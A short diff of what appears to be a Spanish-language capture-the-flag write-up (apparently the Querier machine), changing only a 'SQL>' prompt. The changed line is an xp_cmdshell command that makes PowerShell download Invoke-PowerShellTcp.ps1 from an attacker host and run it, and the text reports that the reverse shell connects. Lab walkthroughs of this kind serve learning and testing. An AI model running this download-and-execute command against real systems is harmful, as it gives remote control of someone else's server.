@@ -297,7 +297,7 @@ querier\mssql-svc
 Vamos a tratar de establecernos una revshell. Para ello tirare del script "Invoke-PowerShellTcp.ps1"
 
 ```bash
-SQL> EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.16.4/Invoke-PowerShellTcp.ps1") | powershell -noprofile'
+EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.16.4/Invoke-PowerShellTcp.ps1") | powershell -noprofile'
 ```
 
 Si miramos nuestro servidor de python y nuestro listener veremos que se ha realizado la petición y tenemos nuestra revshell.
